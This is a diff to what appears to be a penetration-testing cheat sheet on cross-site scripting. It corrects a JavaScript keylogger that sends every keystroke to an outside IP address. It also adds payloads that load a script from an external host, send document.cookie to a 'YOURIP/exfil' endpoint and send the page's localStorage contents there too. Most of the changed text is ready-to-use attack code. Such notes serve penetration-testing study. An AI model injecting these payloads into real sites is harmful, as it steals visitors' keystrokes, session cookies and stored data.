@@ -205,7 +205,7 @@ Usage of hakrawler:
 ### Where to check in code for XSS
 
 Direct Input
-F
+
     JavaScript code <script></script>
     CSS Style Code <style></style>
     Tag/Attribute Fields <div name='INPUT'></div>
@@ -237,16 +237,43 @@ As these functions write raw text to the HTML code, if any user input goes into 
 
 ---
 
-#### Reflected XSS Keylogger
+### Reflected XSS Keylogger
 
 ```
-function logKey(event){
-    fetch("http://192.168.49.188/k?key=" + event.key);
+function logKey(event) {
+    fetch("http://192.168.49.188/k?key=" + event.key)
 }
 
-document.addEventListner("keydown", logKey);
+document.addEventListener('keydown', logKey);
+```
+---
+
+### Pull Payload from External Resource
+`<script src="http://EXTERNALHOST/PAYLOAD">`
+
+---
+
+### Cookie Grabbing JavaScript (**Only works when HTTPOnly Cookie is not present**)
+
+```
+let cookie = document.cookie
+
+let encodedCookie = encodeURIComponent(cookie)
+
+fetch("http://YOURIP/exfil?data=" + encodedCookie)
 ```
 
+---
+
+### Exfiltrate Local Storage JavaScript
+
+```
+let data = JSON.stringify(localStorage)
+
+let encodedData = encodeURIComponent(data)
+
+fetch("http://YOURIP/exfil?data=" + encodedData)
+```
 
 ---
 
